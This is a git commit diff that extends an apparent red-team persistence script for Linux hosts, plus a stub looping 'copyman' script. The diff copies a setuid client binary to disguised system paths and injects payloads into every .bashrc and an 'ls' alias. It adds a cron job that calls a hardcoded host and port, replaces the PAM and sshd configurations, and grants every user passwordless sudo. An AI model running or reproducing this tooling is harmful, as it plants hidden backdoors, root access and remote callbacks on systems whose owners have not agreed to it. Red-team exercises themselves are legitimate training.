a88685e2a1d6404097bd278989f7e57813a6f631
Sunggwan Choi <sxc2679@rit.edu>
2019-09-26 02:44:40 +0100

    Adding more payloads

---
+++ payload/copyman.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+
+# this might be better to be a service, instead of a bash script 
+
+while [ true ]
+do
+	# payload 
+
+
+	# debug
+	echo "hello"
+	sleep 5
+done
--- payload/deploy.sh
+++ payload/deploy.sh
@@ -1,5 +1,9 @@
 #!/bin/bash
 
+#
+#   TODO: Add backdoor users, Timestomping, ps + netstat binaries backdoor 
+#
+
 # Change host and port before the deployment 
 host="192.168.204.128"
 port="8080"
@@ -12,10 +16,12 @@ payload3="/etc/vmware-tools.conf $host $port"
 # Setup tools for basic deployment 
 setup(){
     #yum install -y 
-    apt-get install -y curl wget vim python3
+    apt-get install -y curl wget vim python3 openssh-server
 }
 
 # Timestomp 
+
+# Add backdoor users 
 
 # Clone the client binary into different places 
 clone(){
@@ -27,8 +33,13 @@ clone(){
     cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
     cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
     chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
+
+    # Clone copyman to different location 
+    # Clone all the static files to /var/local, for copyman 
+
 }
 
+# Add bot to all the bashrc found in /home and /root 
 bashrc(){
     bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
     for i in $bashrc; do
@@ -38,13 +49,15 @@ bashrc(){
     sed -i "30 a echo $payload1" /root/.bashrc
 }
 
-# Need persistent alias 
+# Need persistent alias. Right now, this doesn't do anything 
 alias_ls(){
     alias ls="ls; $payload2"
 }
 
+# This might be different in centos, systemctl restart cronjob 
 cronjob(){
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
+    systemctl restart cron 
 }
 
 # Shim binaries
@@ -63,12 +76,29 @@ pam(){
     cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
 }
 
+# vulnerable sshd_config 
+# think about ForceCommand --> iptable drop + run client 
 sshd_config(){
     cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
+    systemctl restart ssh
 }
 
-alias_ls
+# vulnerable bashrc (POG) ? 
+
+# vulnerable sudoers
+sudoers(){
+    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+}
+
+
+########## Start of Main ##########
+
+setup
+clone
+sshd_config
+sudoers
 cronjob
 pam
-clone
 iptables
+
+# Start copyman 
